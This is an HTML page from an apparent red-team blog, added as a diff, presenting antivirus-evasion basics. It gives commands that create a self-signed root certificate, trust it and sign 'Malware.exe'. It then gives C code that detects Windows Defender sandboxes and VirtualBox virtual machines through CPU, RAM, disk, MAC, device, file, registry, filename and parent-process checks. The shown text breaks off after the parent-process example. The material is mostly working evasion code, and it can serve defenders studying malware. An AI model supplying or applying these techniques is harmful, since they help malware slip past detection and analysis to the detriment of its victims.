@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>免杀基础知识 | RedTeaming</title>
+    <meta name="generator" content="VuePress 1.5.2">
+    <link rel="icon" href="/img/redteam.ico">
+    <script data-ad-client="ca-pub-7828333725993554" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <meta name="description" content="RedTeaming">
+    <meta name="keywords" content="RedTeam,XTeamWing,RedTeaming,信息安全,网络安全，红蓝对抗,红队行动,渗透测试">
+    <meta name="baidu-site-verification" content="482fd3a21f12d6c3a2285ac992936bde">
+    <meta name="theme-color" content="#5deff9">
+    <meta name="referrer" content="no-referrer">
+    <link rel="preload" href="/assets/css/0.styles.cb604a48.css" as="style"><link rel="preload" href="/assets/js/app.be83bd91.js" as="script"><link rel="preload" href="/assets/js/2.b71e909d.js" as="script"><link rel="preload" href="/assets/js/3.aae92b90.js" as="script"><link rel="preload" href="/assets/js/17.7e6ee0d8.js" as="script"><link rel="prefetch" href="/assets/js/10.576e2d25.js"><link rel="prefetch" href="/assets/js/11.45ae902f.js"><link rel="prefetch" href="/assets/js/12.78693917.js"><link rel="prefetch" href="/assets/js/13.1b2dd970.js"><link rel="prefetch" href="/assets/js/14.8346b3bc.js"><link rel="prefetch" href="/assets/js/15.c893a769.js"><link rel="prefetch" href="/assets/js/16.416058c5.js"><link rel="prefetch" href="/assets/js/18.b9af0164.js"><link rel="prefetch" href="/assets/js/19.2e02851a.js"><link rel="prefetch" href="/assets/js/20.82df4fa3.js"><link rel="prefetch" href="/assets/js/21.b7a6161a.js"><link rel="prefetch" href="/assets/js/22.3d51065a.js"><link rel="prefetch" href="/assets/js/23.0654865c.js"><link rel="prefetch" href="/assets/js/24.b3170837.js"><link rel="prefetch" href="/assets/js/25.96ec8595.js"><link rel="prefetch" href="/assets/js/26.bbaa98f3.js"><link rel="prefetch" href="/assets/js/27.6cfd0642.js"><link rel="prefetch" href="/assets/js/28.ee7f1e26.js"><link rel="prefetch" href="/assets/js/29.db5477f0.js"><link rel="prefetch" href="/assets/js/4.3486280d.js"><link rel="prefetch" href="/assets/js/5.f6baf9fa.js"><link rel="prefetch" href="/assets/js/6.af4fd23a.js"><link rel="prefetch" href="/assets/js/7.91266911.js"><link rel="prefetch" href="/assets/js/8.98cffdda.js"><link rel="prefetch" href="/assets/js/9.66ac5539.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.cb604a48.css">
+  </head>
+  <body class="theme-mode-light">
+    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/redteam.png" alt="RedTeaming" class="logo"> <span class="site-name can-hide">RedTeaming</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/Blog/" class="nav-link">🤡Blog</a></div><div class="nav-item"><a href="/Marshal/" class="nav-link">🍓Marshal</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/XTeam-Wing" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://i.loli.net/2020/12/23/2LlibEtVrvZoINa.png"> <div class="blogger-info"><h3>Wing</h3> <span>Less talk,More work!</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/Blog/" class="nav-link">🤡Blog</a></div><div class="nav-item"><a href="/Marshal/" class="nav-link">🍓Marshal</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/XTeam-Wing" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>安全开发</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>渗透测试</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>二进制安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>BypassAV</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading open"><span>基础知识</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/e3b49b/" aria-current="page" class="active sidebar-link">免杀基础知识</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#签名二进制文件" class="sidebar-link">签名二进制文件</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#更改依赖项" class="sidebar-link">更改依赖项</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#动态查杀" class="sidebar-link">动态查杀</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#wd有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。" class="sidebar-link">WD有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#mac地址" class="sidebar-link">Mac地址</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#虚拟设备检测" class="sidebar-link">虚拟设备检测</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#hdd-name" class="sidebar-link">HDD Name</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#vm-特定文件和注册表检查" class="sidebar-link">VM 特定文件和注册表检查</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#文件名称被av更改" class="sidebar-link">文件名称被AV更改</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#被父进程启动" class="sidebar-link">被父进程启动</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#枚举调试工具抓包工具" class="sidebar-link">枚举调试工具抓包工具</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#枚举每个进程的地址空间中加载的模块，并检查不需要的名称" class="sidebar-link">枚举每个进程的地址空间中加载的模块，并检查不需要的名称</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较" class="sidebar-link">检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#check-user-name-computer-name" class="sidebar-link">check user name-computer name</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态：" class="sidebar-link">由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态：</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#分辨率检测" class="sidebar-link">分辨率检测</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#usb存储检测" class="sidebar-link">USB存储检测</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#时区检测" class="sidebar-link">时区检测</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#语言检测" class="sidebar-link">语言检测</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#检测自动化分析" class="sidebar-link">检测自动化分析</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#网络连接" class="sidebar-link">网络连接</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#用户交互" class="sidebar-link">用户交互</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#最近文档数目" class="sidebar-link">最近文档数目</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#进程数" class="sidebar-link">进程数</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#系统运行时间" class="sidebar-link">系统运行时间</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#延迟执行" class="sidebar-link">延迟执行</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#内核用户共享数据" class="sidebar-link">内核用户共享数据</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#函数hook" class="sidebar-link">函数Hook</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#直接系统调用绕过-av-apihook" class="sidebar-link">直接系统调用绕过 AV-ApiHook</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#反调试" class="sidebar-link">反调试</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#通过检查代码中的更改来检测断点" class="sidebar-link">通过检查代码中的更改来检测断点</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#通过检查内存页权限来检测断点" class="sidebar-link">通过检查内存页权限来检测断点</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#异常处理程序检测调试" class="sidebar-link">异常处理程序检测调试</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#自调试" class="sidebar-link">自调试</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#执行时间" class="sidebar-link">执行时间</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#为逆向工程师增加难度" class="sidebar-link">为逆向工程师增加难度</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#执行路径回调" class="sidebar-link">执行路径回调</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#tls（线程本地存储）回调" class="sidebar-link">TLS（线程本地存储）回调</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#阻止用户输入-需要admin" class="sidebar-link">阻止用户输入-需要admin</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#静态分析和混淆" class="sidebar-link">静态分析和混淆</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#pe" class="sidebar-link">PE</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#更改hash" class="sidebar-link">更改hash</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#通过动态winapi函数解析来隐藏导入" class="sidebar-link">通过动态WinAPI函数解析来隐藏导入</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#api-hashing" class="sidebar-link">API Hashing</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#shellcode-style" class="sidebar-link">shellcode style</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#pe-analysis" class="sidebar-link">PE analysis</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#熵分析" class="sidebar-link">熵分析</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#编译选项" class="sidebar-link">编译选项</a></li></ul></li></ul></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>自动化工具</span> <span class="arrow right"></span></p> <!----></section></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>漏洞利用</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>内网渗透</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
+      <ins class="adsbygoogle"
+          style="display:block"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="3508773082"
+          data-ad-format="auto"
+          data-full-width-responsive="true"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper bg-style-1"><div class="articleInfo-wrap" data-v-583ea4e9><div class="articleInfo" data-v-583ea4e9><ul class="breadcrumbs" data-v-583ea4e9><li data-v-583ea4e9><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-583ea4e9></a></li> <li data-v-583ea4e9><a href="/categories/?category=Blog" title="分类" data-v-583ea4e9>Blog</a></li> <li data-v-583ea4e9><a href="/categories/?category=BypassAV" title="分类" data-v-583ea4e9>BypassAV</a></li> <li data-v-583ea4e9><a href="/categories/?category=%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="分类" data-v-583ea4e9>基础知识</a></li></ul> <div class="info" data-v-583ea4e9><div title="作者" class="author iconfont icon-touxiang" data-v-583ea4e9><a href="https://github.com/XTeam-Wing" target="_blank" title="作者" class="beLink" data-v-583ea4e9>Wing</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-583ea4e9><a href="javascript:;" data-v-583ea4e9>2021-03-26</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
+          免杀基础知识
+        </h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
+     <ins class="adsbygoogle"
+          style="display:inline-block;width:100%;max-height:90px"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="6625304284"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div> <div class="theme-vdoing-content content__default"><h1 id="免杀技巧"><a href="#免杀技巧" class="header-anchor">#</a> 免杀技巧</h1> <p>[TOC]</p> <h2 id="签名二进制文件"><a href="#签名二进制文件" class="header-anchor">#</a> 签名二进制文件</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>makecert -r -pe -n &quot;CN=Malwr CA&quot; -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer
+certutil -user -addstore Root MalwrCA.cer
+makecert -pe -n &quot;CN=Malwr Cert&quot; -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer
+pvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx
+signtool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="https://i.loli.net/2021/03/26/Iqor3YHQLPX8ldz.jpg" alt="-w1630"></p> <p><img src="https://i.loli.net/2021/03/26/GOfIik9pNAjPCxh.jpg" alt="-w1602"></p> <p>这几个工具在Windows SDK里面
+<img src="https://i.loli.net/2021/03/26/Iz4tnJ7ifEoV6dQ.jpg" alt="-w839"></p> <h2 id="更改依赖项"><a href="#更改依赖项" class="header-anchor">#</a> 更改依赖项</h2> <p><img src="https://i.loli.net/2021/03/26/Cu53EU8YiDxjves.jpg" alt="-w952"></p> <h2 id="动态查杀"><a href="#动态查杀" class="header-anchor">#</a> 动态查杀</h2> <h3 id="wd有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。"><a href="#wd有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。" class="header-anchor">#</a> WD有沙箱会对木马进行动态查杀，通过沙箱识别来进行绕过。</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>// check CPU
+SYSTEM_INFO systemInfo;
+GetSystemInfo(&amp;systemInfo);
+DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+if (numberOfProcessors &lt; 2) return false;
+
+// check RAM
+MEMORYSTATUSEX memoryStatus;
+memoryStatus.dwLength = sizeof(memoryStatus);
+GlobalMemoryStatusEx(&amp;memoryStatus);
+DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+if (RAMMB &lt; 2048) return false;
+
+// check HDD
+HANDLE hDevice = CreateFileW(L&quot;\\\\.\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+DISK_GEOMETRY pDiskGeometry;
+DWORD bytesReturned;
+DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);
+DWORD diskSizeGB;
+diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+if (diskSizeGB &lt; 100) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h3 id="mac地址"><a href="#mac地址" class="header-anchor">#</a> Mac地址</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD adaptersListSize = 0;
+GetAdaptersAddresses(AF_UNSPEC, 0, 0, 0, &amp;adaptersListSize);
+IP_ADAPTER_ADDRESSES* pAdaptersAddresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, adaptersListSize);
+if (pAdaptersAddresses)
+{
+	GetAdaptersAddresses(AF_UNSPEC, 0, 0, pAdaptersAddresses, &amp;adaptersListSize);
+	char mac[6] = { 0 };
+	while (pAdaptersAddresses)
+	{
+		if (pAdaptersAddresses-&gt;PhysicalAddressLength == 6)
+		{
+			memcpy(mac, pAdaptersAddresses-&gt;PhysicalAddress, 6);
+			if (!memcmp({ &quot;\x08\x00\x27&quot; }, mac, 3)) return false;
+		}
+	pAdaptersAddresses = pAdaptersAddresses-&gt;Next;
+	}
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="虚拟设备检测"><a href="#虚拟设备检测" class="header-anchor">#</a> 虚拟设备检测</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>OBJECT_ATTRIBUTES objectAttributes;
+UNICODE_STRING uDeviceName;
+RtlSecureZeroMemory(&amp;uDeviceName, sizeof(uDeviceName));
+RtlInitUnicodeString(&amp;uDeviceName, L&quot;\\Device\\VBoxGuest&quot;); // or pipe: L&quot;\\??\\pipe\\VBoxTrayIPC-&lt;username&gt;&quot;
+InitializeObjectAttributes(&amp;objectAttributes, &amp;uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);
+HANDLE hDevice = NULL;
+IO_STATUS_BLOCK ioStatusBlock;
+NTSTATUS status = NtCreateFile(&amp;hDevice, GENERIC_READ, &amp;objectAttributes, &amp;ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
+if (NT_SUCCESS(status)) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="hdd-name"><a href="#hdd-name" class="header-anchor">#</a> HDD Name</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&amp;GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
+SP_DEVINFO_DATA deviceInfoData;
+deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
+SetupDiEnumDeviceInfo(hDeviceInfo, 0, &amp;deviceInfoData);
+DWORD propertyBufferSize;
+SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &amp;propertyBufferSize);
+PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);
+SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
+CharUpperW(HDDName);
+if (wcsstr(HDDName, L&quot;VBOX&quot;)) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="vm-特定文件和注册表检查"><a href="#vm-特定文件和注册表检查" class="header-anchor">#</a> VM 特定文件和注册表检查</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>// check files
+WIN32_FIND_DATAW findFileData;
+if (FindFirstFileW(L&quot;C:\\Windows\\System32\\VBox*.dll&quot;, &amp;findFileData) != INVALID_HANDLE_VALUE) return false;
+
+// check registry key
+HKEY hkResult;
+if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SYSTEM\\ControlSet001\\Services\\VBoxSF&quot;, 0, KEY_QUERY_VALUE, &amp;hkResult) == ERROR_SUCCESS) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="文件名称被av更改"><a href="#文件名称被av更改" class="header-anchor">#</a> 文件名称被AV更改</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>wchar_t currentProcessPath[MAX_PATH + 1];
+GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
+CharUpperW(currentProcessPath);
+if (!wcsstr(currentProcessPath, L&quot;C:\\USERS\\PUBLIC\\&quot;)) return false;
+if (!wcsstr(currentProcessPath, L&quot;MALWARE.EXE&quot;)) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="被父进程启动"><a href="#被父进程启动" class="header-anchor">#</a> 被父进程启动</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD GetParentPID(DWORD pid)
+{
+	DWORD ppid = 0;
+	PROCESSENTRY32W processEntry = { 0 };
+	processEntry.dwSize = sizeof(PROCESSENTRY32W);
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (Process32FirstW(hSnapshot, &amp;processEntry))
+	{
+		do
+		{
+			if (processEntry.th32ProcessID == pid)
+			{
+				ppid = processEntry.th32ParentProcessID;
+				break;
+			}
+		} while (Process32NextW(hSnapshot, &amp;processEntry));
+	}
+	CloseHandle(hSnapshot);
+	return ppid;
+}
+
+void main()
+{
+	DWORD parentPid = GetParentPID(GetCurrentProcessId());
+	WCHAR parentName[MAX_PATH + 1];
+	DWORD dwParentName = MAX_PATH;
+	HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
+	QueryFullProcessImageNameW(hParent, 0, parentName, &amp;dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot'
+	CharUpperW(parentName);
+	if (wcsstr(parentName, L&quot;WINDBG.EXE&quot;)) return;
+
+	wprintf_s(L&quot;Now hacking...\n&quot;);
+}
